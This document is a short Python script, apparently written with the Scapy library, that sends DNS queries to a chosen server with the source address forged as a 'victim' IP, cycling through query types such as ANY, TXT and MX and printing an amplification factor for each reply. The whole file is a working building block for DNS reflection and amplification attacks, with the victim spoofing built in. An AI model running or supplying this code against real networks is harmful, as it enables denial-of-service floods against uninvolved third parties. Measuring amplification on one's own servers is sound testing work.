#! /usr/bin/env python3
# run as sudo
from scapy.all import *
import sys
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-I", "--Interface", dest="Interface",
                        help="Network Interface", required=True)
    parser.add_argument("-v", "--victim-ip", dest="victim",
                        help="victim IP address", required=True)
    parser.add_argument("-d", "--dns-ip", dest="dns",
                        help="dns server ip address", required=True)
    opt = parser.parse_args()
    return opt


def main():

    # interface = "wlp0s20f3"                    # Interface you want to use
    # victim = "192.168.66.45"               # IP of that interface
    # dnsTarget = ["ip1","ip2","ip3"] # List of DNS Server IPs
    opt = get_arguments()
    dnsTarget = opt.dns
    victim = opt.victim
    interface = opt.Interface
    time_to_live = 128

    query_name = "google.com"
    query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"]

    for i in range(0,len(query_type)):
        
        packet = IP(src=victim, dst=dnsTarget, ttl=time_to_live) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
        try:
            
            
            # send() 
            query = sr1(packet, iface=interface, timeout=10) #will wait until one response
            print(query[DNS].summary())
            print('amplification_factor %f' % (len(query)/len(packet)))
        except TypeError:
            print("time out")

if __name__ == "__main__":
    main()
